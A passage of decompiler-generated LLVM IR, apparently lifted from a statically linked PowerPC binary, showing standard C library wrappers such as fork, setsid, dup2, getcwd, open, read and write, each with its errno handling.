  br label %dec_label_pc_10007778

dec_label_pc_10007778:                            ; preds = %entry, %dec_label_pc_1000776c
  %v0_10007788 = phi i32 [ %v0_1000775c, %entry ], [ -1, %dec_label_pc_1000776c ]
  ret i32 %v0_10007788

; uselistorder directives
  uselistorder label %dec_label_pc_10007778, { 1, 0 }
}

define i32 @__GI__exit(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  br label %dec_label_pc_100077a0

dec_label_pc_100077a0:                            ; preds = %dec_label_pc_100077a0.backedge, %entry
  %v0_100077ac = call i32 @__asm_mfcr()
  %v1_100077b0 = and i32 %v0_100077ac, 268435456
  %v3_100077b0 = icmp eq i32 %v1_100077b0, 0
  store i32 %v0_100077ac, i32* %r31.global-to-local, align 4
  br i1 %v3_100077b0, label %dec_label_pc_100077a0.backedge, label %dec_label_pc_100077bc

dec_label_pc_100077bc:                            ; preds = %dec_label_pc_100077a0
  %v0_100077bc = call i32 @__errno_location()
  %v0_100077c0 = load i32, i32* %r31.global-to-local, align 4
  %v2_100077c0 = inttoptr i32 %v0_100077bc to i32*
  store i32 %v0_100077c0, i32* %v2_100077c0, align 4
  br label %dec_label_pc_100077a0.backedge

dec_label_pc_100077a0.backedge:                   ; preds = %dec_label_pc_100077bc, %dec_label_pc_100077a0
  br label %dec_label_pc_100077a0
}

define i32 @chdir(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_100077e0 = call i32 @__asm_mfcr()
  %v1_100077e4 = and i32 %v0_100077e0, 268435456
  %v3_100077e4 = icmp eq i32 %v1_100077e4, 0
  store i32 %v0_100077e0, i32* %r31.global-to-local, align 4
  br i1 %v3_100077e4, label %dec_label_pc_100077fc, label %dec_label_pc_100077f0

dec_label_pc_100077f0:                            ; preds = %entry
  %v0_100077f0 = call i32 @__errno_location()
  %v0_100077f4 = load i32, i32* %r31.global-to-local, align 4
  %v2_100077f4 = inttoptr i32 %v0_100077f0 to i32*
  store i32 %v0_100077f4, i32* %v2_100077f4, align 4
  br label %dec_label_pc_100077fc

dec_label_pc_100077fc:                            ; preds = %entry, %dec_label_pc_100077f0
  %v0_1000780c = phi i32 [ %v0_100077e0, %entry ], [ -1, %dec_label_pc_100077f0 ]
  ret i32 %v0_1000780c

; uselistorder directives
  uselistorder label %dec_label_pc_100077fc, { 1, 0 }
}

define i32 @__libc_close(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10007828 = call i32 @__asm_mfcr()
  %v1_1000782c = and i32 %v0_10007828, 268435456
  %v3_1000782c = icmp eq i32 %v1_1000782c, 0
  store i32 %v0_10007828, i32* %r31.global-to-local, align 4
  br i1 %v3_1000782c, label %dec_label_pc_10007844, label %dec_label_pc_10007838

dec_label_pc_10007838:                            ; preds = %entry
  %v0_10007838 = call i32 @__errno_location()
  %v0_1000783c = load i32, i32* %r31.global-to-local, align 4
  %v2_1000783c = inttoptr i32 %v0_10007838 to i32*
  store i32 %v0_1000783c, i32* %v2_1000783c, align 4
  br label %dec_label_pc_10007844

dec_label_pc_10007844:                            ; preds = %entry, %dec_label_pc_10007838
  %v0_10007854 = phi i32 [ %v0_10007828, %entry ], [ -1, %dec_label_pc_10007838 ]
  ret i32 %v0_10007854

; uselistorder directives
  uselistorder label %dec_label_pc_10007844, { 1, 0 }
}

define i32 @dup2(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10007870 = call i32 @__asm_mfcr()
  %v1_10007874 = and i32 %v0_10007870, 268435456
  %v3_10007874 = icmp eq i32 %v1_10007874, 0
  store i32 %v0_10007870, i32* %r31.global-to-local, align 4
  br i1 %v3_10007874, label %dec_label_pc_1000788c, label %dec_label_pc_10007880

dec_label_pc_10007880:                            ; preds = %entry
  %v0_10007880 = call i32 @__errno_location()
  %v0_10007884 = load i32, i32* %r31.global-to-local, align 4
  %v2_10007884 = inttoptr i32 %v0_10007880 to i32*
  store i32 %v0_10007884, i32* %v2_10007884, align 4
  br label %dec_label_pc_1000788c

dec_label_pc_1000788c:                            ; preds = %entry, %dec_label_pc_10007880
  %v0_1000789c = phi i32 [ %v0_10007870, %entry ], [ -1, %dec_label_pc_10007880 ]
  ret i32 %v0_1000789c

; uselistorder directives
  uselistorder label %dec_label_pc_1000788c, { 1, 0 }
}

define i32 @__libc_fork() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_100078b8 = call i32 @__asm_mfcr()
  %v1_100078bc = and i32 %v0_100078b8, 268435456
  %v3_100078bc = icmp eq i32 %v1_100078bc, 0
  store i32 %v0_100078b8, i32* %r31.global-to-local, align 4
  br i1 %v3_100078bc, label %dec_label_pc_100078d4, label %dec_label_pc_100078c8

dec_label_pc_100078c8:                            ; preds = %entry
  %v0_100078c8 = call i32 @__errno_location()
  %v0_100078cc = load i32, i32* %r31.global-to-local, align 4
  %v2_100078cc = inttoptr i32 %v0_100078c8 to i32*
  store i32 %v0_100078cc, i32* %v2_100078cc, align 4
  br label %dec_label_pc_100078d4

dec_label_pc_100078d4:                            ; preds = %entry, %dec_label_pc_100078c8
  %v0_100078e4 = phi i32 [ %v0_100078b8, %entry ], [ -1, %dec_label_pc_100078c8 ]
  ret i32 %v0_100078e4

; uselistorder directives
  uselistorder label %dec_label_pc_100078d4, { 1, 0 }
}

define i32 @getcwd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r28, align 4
  %v3_100078f4 = icmp eq i32 %arg2, 0
  store i32 %arg1, i32* @r30, align 4
  %v3_10007904 = icmp eq i32 %arg1, 0
  br i1 %v3_100078f4, label %dec_label_pc_10007904, label %dec_label_pc_10007938

dec_label_pc_10007904:                            ; preds = %entry
  br i1 %v3_10007904, label %dec_label_pc_10007920, label %dec_label_pc_1000790c

dec_label_pc_1000790c:                            ; preds = %dec_label_pc_10007904
  %v0_1000790c = call i32 @__errno_location()
  store i32 0, i32* @r30, align 4
  %v2_10007918 = inttoptr i32 %v0_1000790c to i32*
  store i32 22, i32* %v2_10007918, align 4
  br label %dec_label_pc_100079d0

dec_label_pc_10007920:                            ; preds = %dec_label_pc_10007904
  store i32 268466468, i32* @lr, align 4
  %v0_10007920 = call i32 @__GI_getpagesize()
  %v1_10007924 = icmp slt i32 %v0_10007920, 4096
  %v0_10007928. = select i1 %v1_10007924, i32 4096, i32 %v0_10007920
  store i32 %v0_10007928., i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10007948

dec_label_pc_10007938:                            ; preds = %entry
  store i32 %arg2, i32* %r31.global-to-local, align 4
  store i32 %arg1, i32* @r29, align 4
  br i1 %v3_10007904, label %dec_label_pc_10007948, label %dec_label_pc_10007958

dec_label_pc_10007948:                            ; preds = %dec_label_pc_10007920, %dec_label_pc_10007938
  %v0_10007948 = phi i32 [ %v0_10007928., %dec_label_pc_10007920 ], [ %arg2, %dec_label_pc_10007938 ]
  store i32 %v0_10007948, i32* @r3, align 4
  store i32 268466512, i32* @lr, align 4
  %v0_1000794c = call i32 @malloc()
  store i32 %v0_1000794c, i32* @r29, align 4
  %v3_10007950 = icmp eq i32 %v0_1000794c, 0
  br i1 %v3_10007950, label %dec_label_pc_100079cc, label %dec_label_pc_10007948.dec_label_pc_10007958_crit_edge

dec_label_pc_10007948.dec_label_pc_10007958_crit_edge: ; preds = %dec_label_pc_10007948
  br label %dec_label_pc_10007958

dec_label_pc_10007958:                            ; preds = %dec_label_pc_10007948.dec_label_pc_10007958_crit_edge, %dec_label_pc_10007938
  %v0_10007968 = call i32 @__asm_mfcr()
  %v1_1000796c = and i32 %v0_10007968, 268435456
  %v3_1000796c = icmp eq i32 %v1_1000796c, 0
  store i32 %v0_10007968, i32* %r31.global-to-local, align 4
  store i32 %v0_10007968, i32* @r4, align 4
  br i1 %v3_1000796c, label %dec_label_pc_10007988, label %dec_label_pc_1000797c

dec_label_pc_1000797c:                            ; preds = %dec_label_pc_10007958
  %v0_1000797c = call i32 @__errno_location()
  store i32 -1, i32* @r4, align 4
  %v0_10007984 = load i32, i32* %r31.global-to-local, align 4
  %v2_10007984 = inttoptr i32 %v0_1000797c to i32*
  store i32 %v0_10007984, i32* %v2_10007984, align 4
  %v0_10007988.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_10007988

dec_label_pc_10007988:                            ; preds = %dec_label_pc_10007958, %dec_label_pc_1000797c
  %v0_10007988 = phi i32 [ %v0_10007968, %dec_label_pc_10007958 ], [ %v0_10007988.pre, %dec_label_pc_1000797c ]
  %v1_10007988 = icmp slt i32 %v0_10007988, 0
  %v0_1000798c = load i32, i32* @r30, align 4
  %v3_1000798c = icmp eq i32 %v0_1000798c, 0
  br i1 %v1_10007988, label %dec_label_pc_100079bc, label %dec_label_pc_10007994

dec_label_pc_10007994:                            ; preds = %dec_label_pc_10007988
  br i1 %v3_1000798c, label %dec_label_pc_10007998, label %dec_label_pc_100079ac.thread8

dec_label_pc_100079ac.thread8:                    ; preds = %dec_label_pc_10007994
  br label %dec_label_pc_100079d0

dec_label_pc_10007998:                            ; preds = %dec_label_pc_10007994
  %v0_10007998 = load i32, i32* @r28, align 4
  %v3_10007998 = icmp eq i32 %v0_10007998, 0
  br i1 %v3_10007998, label %dec_label_pc_100079ac, label %dec_label_pc_100079ac.thread

dec_label_pc_100079ac.thread:                     ; preds = %dec_label_pc_10007998
  br label %dec_label_pc_100079b4

dec_label_pc_100079ac:                            ; preds = %dec_label_pc_10007998
  %v0_100079a0 = load i32, i32* @r29, align 4
  store i32 268466600, i32* @lr, align 4
  %v1_100079a4 = call i32 @realloc(i32 %v0_100079a0)
  store i32 %v1_100079a4, i32* @r30, align 4
  %v3_100079ac = icmp eq i32 %v1_100079a4, 0
  br i1 %v3_100079ac, label %dec_label_pc_100079b4, label %dec_label_pc_100079d0

dec_label_pc_100079b4:                            ; preds = %dec_label_pc_100079ac.thread, %dec_label_pc_100079ac
  %v0_100079b4 = load i32, i32* @r29, align 4
  store i32 %v0_100079b4, i32* @r30, align 4
  br label %dec_label_pc_100079d0

dec_label_pc_100079bc:                            ; preds = %dec_label_pc_10007988
  br i1 %v3_1000798c, label %dec_label_pc_100079c0, label %dec_label_pc_100079cc

dec_label_pc_100079c0:                            ; preds = %dec_label_pc_100079bc
  %v0_100079c0 = load i32, i32* @r29, align 4
  store i32 %v0_100079c0, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_100079c8.270 to i32), i32* @lr, align 4
  %v0_100079c4 = call i32 @free()
  br label %dec_label_pc_100079d0

dec_label_pc_100079cc:                            ; preds = %dec_label_pc_100079bc, %dec_label_pc_10007948
  store i32 0, i32* @r30, align 4
  br label %dec_label_pc_100079d0

dec_label_pc_100079d0:                            ; preds = %dec_label_pc_100079ac.thread8, %dec_label_pc_100079ac, %dec_label_pc_100079c0, %dec_label_pc_100079b4, %dec_label_pc_1000790c, %dec_label_pc_100079cc
  %v0_100079d4 = load i32, i32* @r30, align 4
  ret i32 %v0_100079d4

; uselistorder directives
  uselistorder i32 %v0_10007968, { 0, 2, 1, 3 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100079d0, { 5, 2, 3, 1, 0, 4 }
  uselistorder label %dec_label_pc_100079b4, { 1, 0 }
  uselistorder label %dec_label_pc_10007988, { 1, 0 }
  uselistorder label %dec_label_pc_10007948, { 1, 0 }
}

define i32 @getdtablesize(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v2_100079f4 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268466688, i32* @lr, align 4
  %v2_100079fc = call i32 @getrlimit(i32 7, i32 %v2_100079f4)
  %v1_10007a00 = icmp slt i32 %v2_100079fc, 0
  br i1 %v1_10007a00, label %dec_label_pc_10007a10, label %dec_label_pc_10007a0c

dec_label_pc_10007a0c:                            ; preds = %entry
  %v3_10007a0c = load i32, i32* %stack_var_-24, align 4
  br label %dec_label_pc_10007a10

dec_label_pc_10007a10:                            ; preds = %entry, %dec_label_pc_10007a0c
  %v0_10007a1c = phi i32 [ 256, %entry ], [ %v3_10007a0c, %dec_label_pc_10007a0c ]
  ret i32 %v0_10007a1c

; uselistorder directives
  uselistorder label %dec_label_pc_10007a10, { 1, 0 }
}

define i32 @__GI_getpagesize() local_unnamed_addr {
entry:
  %v3_10007a28 = load i32, i32* @global_var_10023560.271, align 4
  %v3_10007a2c = icmp eq i32 %v3_10007a28, 0
  %v0_10007a30 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_10007a2c, i32 %v0_10007a30)
  ret i32 %v3_10007a28
}

define i32 @__libc_getpid() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10007a54 = call i32 @__asm_mfcr()
  %v1_10007a58 = and i32 %v0_10007a54, 268435456
  %v3_10007a58 = icmp eq i32 %v1_10007a58, 0
  store i32 %v0_10007a54, i32* %r31.global-to-local, align 4
  br i1 %v3_10007a58, label %dec_label_pc_10007a70, label %dec_label_pc_10007a64

dec_label_pc_10007a64:                            ; preds = %entry
  %v0_10007a64 = call i32 @__errno_location()
  %v0_10007a68 = load i32, i32* %r31.global-to-local, align 4
  %v2_10007a68 = inttoptr i32 %v0_10007a64 to i32*
  store i32 %v0_10007a68, i32* %v2_10007a68, align 4
  br label %dec_label_pc_10007a70

dec_label_pc_10007a70:                            ; preds = %entry, %dec_label_pc_10007a64
  %v0_10007a80 = phi i32 [ %v0_10007a54, %entry ], [ -1, %dec_label_pc_10007a64 ]
  ret i32 %v0_10007a80

; uselistorder directives
  uselistorder label %dec_label_pc_10007a70, { 1, 0 }
}

define i32 @getrlimit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10007a9c = call i32 @__asm_mfcr()
  %v1_10007aa0 = and i32 %v0_10007a9c, 268435456
  %v3_10007aa0 = icmp eq i32 %v1_10007aa0, 0
  store i32 %v0_10007a9c, i32* %r31.global-to-local, align 4
  br i1 %v3_10007aa0, label %dec_label_pc_10007ab8, label %dec_label_pc_10007aac

dec_label_pc_10007aac:                            ; preds = %entry
  %v0_10007aac = call i32 @__errno_location()
  %v0_10007ab0 = load i32, i32* %r31.global-to-local, align 4
  %v2_10007ab0 = inttoptr i32 %v0_10007aac to i32*
  store i32 %v0_10007ab0, i32* %v2_10007ab0, align 4
  br label %dec_label_pc_10007ab8

dec_label_pc_10007ab8:                            ; preds = %entry, %dec_label_pc_10007aac
  %v0_10007ac8 = phi i32 [ %v0_10007a9c, %entry ], [ -1, %dec_label_pc_10007aac ]
  ret i32 %v0_10007ac8

; uselistorder directives
  uselistorder label %dec_label_pc_10007ab8, { 1, 0 }
}

define i32 @kill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10007ae4 = call i32 @__asm_mfcr()
  %v1_10007ae8 = and i32 %v0_10007ae4, 268435456
  %v3_10007ae8 = icmp eq i32 %v1_10007ae8, 0
  store i32 %v0_10007ae4, i32* %r31.global-to-local, align 4
  br i1 %v3_10007ae8, label %dec_label_pc_10007b00, label %dec_label_pc_10007af4

dec_label_pc_10007af4:                            ; preds = %entry
  %v0_10007af4 = call i32 @__errno_location()
  %v0_10007af8 = load i32, i32* %r31.global-to-local, align 4
  %v2_10007af8 = inttoptr i32 %v0_10007af4 to i32*
  store i32 %v0_10007af8, i32* %v2_10007af8, align 4
  br label %dec_label_pc_10007b00

dec_label_pc_10007b00:                            ; preds = %entry, %dec_label_pc_10007af4
  %v0_10007b10 = phi i32 [ %v0_10007ae4, %entry ], [ -1, %dec_label_pc_10007af4 ]
  ret i32 %v0_10007b10

; uselistorder directives
  uselistorder label %dec_label_pc_10007b00, { 1, 0 }
}

define i32 @__libc_open(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v1_10007b28 = and i32 %arg2, 64
  %v3_10007b28 = icmp eq i32 %v1_10007b28, 0
  br i1 %v3_10007b28, label %dec_label_pc_10007b54, label %dec_label_pc_10007b38

dec_label_pc_10007b38:                            ; preds = %entry
  %v2_10007b40 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_10007b40, i32* %stack_var_-32, align 4
  %v0_10007b50 = load i32, i32* @r5, align 4
  br label %dec_label_pc_10007b54

dec_label_pc_10007b54:                            ; preds = %entry, %dec_label_pc_10007b38
  %v0_10007b54 = phi i32 [ 0, %entry ], [ %v0_10007b50, %dec_label_pc_10007b38 ]
  store i32 %v0_10007b54, i32* @r5, align 4
  %v0_10007b5c = call i32 @__asm_mfcr()
  %v1_10007b60 = and i32 %v0_10007b5c, 268435456
  %v3_10007b60 = icmp eq i32 %v1_10007b60, 0
  store i32 %v0_10007b5c, i32* %r31.global-to-local, align 4
  br i1 %v3_10007b60, label %dec_label_pc_10007b78, label %dec_label_pc_10007b6c

dec_label_pc_10007b6c:                            ; preds = %dec_label_pc_10007b54
  %v0_10007b6c = call i32 @__errno_location()
  %v0_10007b70 = load i32, i32* %r31.global-to-local, align 4
  %v2_10007b70 = inttoptr i32 %v0_10007b6c to i32*
  store i32 %v0_10007b70, i32* %v2_10007b70, align 4
  br label %dec_label_pc_10007b78

dec_label_pc_10007b78:                            ; preds = %dec_label_pc_10007b54, %dec_label_pc_10007b6c
  %v0_10007b88 = phi i32 [ %v0_10007b5c, %dec_label_pc_10007b54 ], [ -1, %dec_label_pc_10007b6c ]
  ret i32 %v0_10007b88

; uselistorder directives
  uselistorder label %dec_label_pc_10007b78, { 1, 0 }
  uselistorder label %dec_label_pc_10007b54, { 1, 0 }
}

define i32 @__libc_creat(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r5, align 4
  %v2_10007b98 = call i32 @__libc_open(i32 577, i32 577)
  ret i32 %v2_10007b98
}

define i32 @__GI_pipe(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10007bb4 = call i32 @__asm_mfcr()
  %v1_10007bb8 = and i32 %v0_10007bb4, 268435456
  %v3_10007bb8 = icmp eq i32 %v1_10007bb8, 0
  store i1 false, i1* @cr0_so, align 1
  store i32 %v0_10007bb4, i32* %r31.global-to-local, align 4
  br i1 %v3_10007bb8, label %dec_label_pc_10007bd0, label %dec_label_pc_10007bc4

dec_label_pc_10007bc4:                            ; preds = %entry
  %v0_10007bc4 = call i32 @__errno_location()
  %v0_10007bc8 = load i32, i32* %r31.global-to-local, align 4
  %v2_10007bc8 = inttoptr i32 %v0_10007bc4 to i32*
  store i32 %v0_10007bc8, i32* %v2_10007bc8, align 4
  br label %dec_label_pc_10007bd0

dec_label_pc_10007bd0:                            ; preds = %entry, %dec_label_pc_10007bc4
  %v0_10007be0 = phi i32 [ %v0_10007bb4, %entry ], [ -1, %dec_label_pc_10007bc4 ]
  ret i32 %v0_10007be0

; uselistorder directives
  uselistorder label %dec_label_pc_10007bd0, { 1, 0 }
}

define i32 @prctl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10007bfc = call i32 @__asm_mfcr()
  %v1_10007c00 = and i32 %v0_10007bfc, 268435456
  %v3_10007c00 = icmp eq i32 %v1_10007c00, 0
  store i32 %v0_10007bfc, i32* %r31.global-to-local, align 4
  br i1 %v3_10007c00, label %dec_label_pc_10007c18, label %dec_label_pc_10007c0c

dec_label_pc_10007c0c:                            ; preds = %entry
  %v0_10007c0c = call i32 @__errno_location()
  %v0_10007c10 = load i32, i32* %r31.global-to-local, align 4
  %v2_10007c10 = inttoptr i32 %v0_10007c0c to i32*
  store i32 %v0_10007c10, i32* %v2_10007c10, align 4
  br label %dec_label_pc_10007c18

dec_label_pc_10007c18:                            ; preds = %entry, %dec_label_pc_10007c0c
  %v0_10007c28 = phi i32 [ %v0_10007bfc, %entry ], [ -1, %dec_label_pc_10007c0c ]
  ret i32 %v0_10007c28

; uselistorder directives
  uselistorder label %dec_label_pc_10007c18, { 1, 0 }
}

define i32 @__libc_read(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10007c44 = call i32 @__asm_mfcr()
  %v1_10007c48 = and i32 %v0_10007c44, 268435456
  %v3_10007c48 = icmp eq i32 %v1_10007c48, 0
  store i32 %v0_10007c44, i32* %r31.global-to-local, align 4
  br i1 %v3_10007c48, label %dec_label_pc_10007c60, label %dec_label_pc_10007c54

dec_label_pc_10007c54:                            ; preds = %entry
  %v0_10007c54 = call i32 @__errno_location()
  %v0_10007c58 = load i32, i32* %r31.global-to-local, align 4
  %v2_10007c58 = inttoptr i32 %v0_10007c54 to i32*
  store i32 %v0_10007c58, i32* %v2_10007c58, align 4
  br label %dec_label_pc_10007c60

dec_label_pc_10007c60:                            ; preds = %entry, %dec_label_pc_10007c54
  %v0_10007c70 = phi i32 [ %v0_10007c44, %entry ], [ -1, %dec_label_pc_10007c54 ]
  ret i32 %v0_10007c70

; uselistorder directives
  uselistorder label %dec_label_pc_10007c60, { 1, 0 }
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10007c8c = call i32 @__asm_mfcr()
  %v1_10007c90 = and i32 %v0_10007c8c, 268435456
  %v3_10007c90 = icmp eq i32 %v1_10007c90, 0
  store i32 %v0_10007c8c, i32* %r31.global-to-local, align 4
  br i1 %v3_10007c90, label %dec_label_pc_10007ca8, label %dec_label_pc_10007c9c

dec_label_pc_10007c9c:                            ; preds = %entry
  %v0_10007c9c = call i32 @__errno_location()
  %v0_10007ca0 = load i32, i32* %r31.global-to-local, align 4
  %v2_10007ca0 = inttoptr i32 %v0_10007c9c to i32*
  store i32 %v0_10007ca0, i32* %v2_10007ca0, align 4
  br label %dec_label_pc_10007ca8

dec_label_pc_10007ca8:                            ; preds = %entry, %dec_label_pc_10007c9c
  %v0_10007cb8 = phi i32 [ %v0_10007c8c, %entry ], [ -1, %dec_label_pc_10007c9c ]
  ret i32 %v0_10007cb8

; uselistorder directives
  uselistorder label %dec_label_pc_10007ca8, { 1, 0 }
}

define i32 @__GI_setsid() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10007cd4 = call i32 @__asm_mfcr()
  %v1_10007cd8 = and i32 %v0_10007cd4, 268435456
  %v3_10007cd8 = icmp eq i32 %v1_10007cd8, 0
  store i32 %v0_10007cd4, i32* %r31.global-to-local, align 4
  br i1 %v3_10007cd8, label %dec_label_pc_10007cf0, label %dec_label_pc_10007ce4

dec_label_pc_10007ce4:                            ; preds = %entry
  %v0_10007ce4 = call i32 @__errno_location()
  %v0_10007ce8 = load i32, i32* %r31.global-to-local, align 4
  %v2_10007ce8 = inttoptr i32 %v0_10007ce4 to i32*
  store i32 %v0_10007ce8, i32* %v2_10007ce8, align 4
  br label %dec_label_pc_10007cf0

dec_label_pc_10007cf0:                            ; preds = %entry, %dec_label_pc_10007ce4
  %v0_10007d00 = phi i32 [ %v0_10007cd4, %entry ], [ -1, %dec_label_pc_10007ce4 ]
  ret i32 %v0_10007d00

; uselistorder directives
  uselistorder label %dec_label_pc_10007cf0, { 1, 0 }
}

define i32 @__GI_sigprocmask(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v3_10007d04 = icmp eq i32 %arg2, 0
  br i1 %v3_10007d04, label %dec_label_pc_10007d44, label %dec_label_pc_10007d2c

dec_label_pc_10007d2c:                            ; preds = %entry
  store i32 -1, i32* %r31.global-to-local, align 4
  %tmp5 = icmp ult i32 %arg1, 3
  br i1 %tmp5, label %dec_label_pc_10007d44, label %dec_label_pc_10007d34

dec_label_pc_10007d34:                            ; preds = %dec_label_pc_10007d2c
  %v0_10007d34 = call i32 @__errno_location()
  %v2_10007d3c = inttoptr i32 %v0_10007d34 to i32*
  store i32 22, i32* %v2_10007d3c, align 4
  %v0_10007d68.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10007d64

dec_label_pc_10007d44:                            ; preds = %dec_label_pc_10007d2c, %entry
  %v0_10007d48 = call i32 @__asm_mfcr()
  %v1_10007d4c = and i32 %v0_10007d48, 268435456
  %v3_10007d4c = icmp eq i32 %v1_10007d4c, 0
  store i32 %v0_10007d48, i32* %r31.global-to-local, align 4
  br i1 %v3_10007d4c, label %dec_label_pc_10007d64, label %dec_label_pc_10007d58

dec_label_pc_10007d58:                            ; preds = %dec_label_pc_10007d44
  %v0_10007d58 = call i32 @__errno_location()
  %v0_10007d5c = load i32, i32* %r31.global-to-local, align 4
  %v2_10007d5c = inttoptr i32 %v0_10007d58 to i32*
  store i32 %v0_10007d5c, i32* %v2_10007d5c, align 4
  store i32 -1, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10007d64

dec_label_pc_10007d64:                            ; preds = %dec_label_pc_10007d44, %dec_label_pc_10007d34, %dec_label_pc_10007d58
  %v0_10007d68 = phi i32 [ %v0_10007d48, %dec_label_pc_10007d44 ], [ %v0_10007d68.pre, %dec_label_pc_10007d34 ], [ -1, %dec_label_pc_10007d58 ]
  ret i32 %v0_10007d68

; uselistorder directives
  uselistorder label %dec_label_pc_10007d64, { 2, 0, 1 }
}

define i32 @__GI_time(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10007d94 = call i32 @__asm_mfcr()
  %v1_10007d98 = and i32 %v0_10007d94, 268435456
  %v3_10007d98 = icmp eq i32 %v1_10007d98, 0
  store i32 %v0_10007d94, i32* %r31.global-to-local, align 4
  br i1 %v3_10007d98, label %dec_label_pc_10007db0, label %dec_label_pc_10007da4

dec_label_pc_10007da4:                            ; preds = %entry
  %v0_10007da4 = call i32 @__errno_location()
  %v0_10007da8 = load i32, i32* %r31.global-to-local, align 4
  %v2_10007da8 = inttoptr i32 %v0_10007da4 to i32*
  store i32 %v0_10007da8, i32* %v2_10007da8, align 4
  br label %dec_label_pc_10007db0

dec_label_pc_10007db0:                            ; preds = %entry, %dec_label_pc_10007da4
  %v0_10007dc0 = phi i32 [ %v0_10007d94, %entry ], [ -1, %dec_label_pc_10007da4 ]
  ret i32 %v0_10007dc0

; uselistorder directives
  uselistorder label %dec_label_pc_10007db0, { 1, 0 }
}

define i32 @__libc_waitpid(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v1_10007dc8 = call i32 @wait4(i32 0)
  ret i32 %v1_10007dc8
}

define i32 @__libc_write(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10007de4 = call i32 @__asm_mfcr()
  %v1_10007de8 = and i32 %v0_10007de4, 268435456
  %v3_10007de8 = icmp eq i32 %v1_10007de8, 0
  store i32 %v0_10007de4, i32* %r31.global-to-local, align 4
  br i1 %v3_10007de8, label %dec_label_pc_10007e00, label %dec_label_pc_10007df4

dec_label_pc_10007df4:                            ; preds = %entry
  %v0_10007df4 = call i32 @__errno_location()
  %v0_10007df8 = load i32, i32* %r31.global-to-local, align 4
  %v2_10007df8 = inttoptr i32 %v0_10007df4 to i32*
  store i32 %v0_10007df8, i32* %v2_10007df8, align 4
  br label %dec_label_pc_10007e00

dec_label_pc_10007e00:                            ; preds = %entry, %dec_label_pc_10007df4
  %v0_10007e10 = phi i32 [ %v0_10007de4, %entry ], [ -1, %dec_label_pc_10007df4 ]
  ret i32 %v0_10007e10

; uselistorder directives
  uselistorder label %dec_label_pc_10007e00, { 1, 0 }
}

define i32 @isspace(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_10007e18 = mul i32 %arg1, 2
  %v3_10007e1c = load i32, i32* inttoptr (i32 268580056 to i32*), align 8
  %v2_10007e20 = add i32 %v3_10007e1c, %v1_10007e18
  %v3_10007e20 = inttoptr i32 %v2_10007e20 to i16*
  %v4_10007e20 = load i16, i16* %v3_10007e20, align 2
  %v5_10007e20 = zext i16 %v4_10007e20 to i32
  %v1_10007e24 = call i32 @__asm_rlwinm(i32 %v5_10007e20, i32 0, i32 26, i32 26)
  ret i32 %v1_10007e24
}

define i32 @__GI_toupper(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_10007e2c = add i32 %arg1, 128
  %v1_10007e30 = mul i32 %arg1, 2
  %v2_10007e34 = icmp ugt i32 %v1_10007e2c, 383
  %v0_10007e38 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_10007e34, i32 %v0_10007e38)
  %v3_10007e40 = load i32, i32* inttoptr (i32 268580064 to i32*), align 32
  %v2_10007e44 = add i32 %v1_10007e30, %v3_10007e40
  %v3_10007e44 = inttoptr i32 %v2_10007e44 to i16*
  %v4_10007e44 = load i16, i16* %v3_10007e44, align 2
  %v5_10007e44 = sext i16 %v4_10007e44 to i32
  ret i32 %v5_10007e44
}

define i32 @__errno_location() local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_10023570.278 to i32)
}

define i32 @__GI_fclose(i16* %arg1) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  store i32 %tmp, i32* @r31, align 4
  %v2_10007e6c = add i32 %tmp, 52
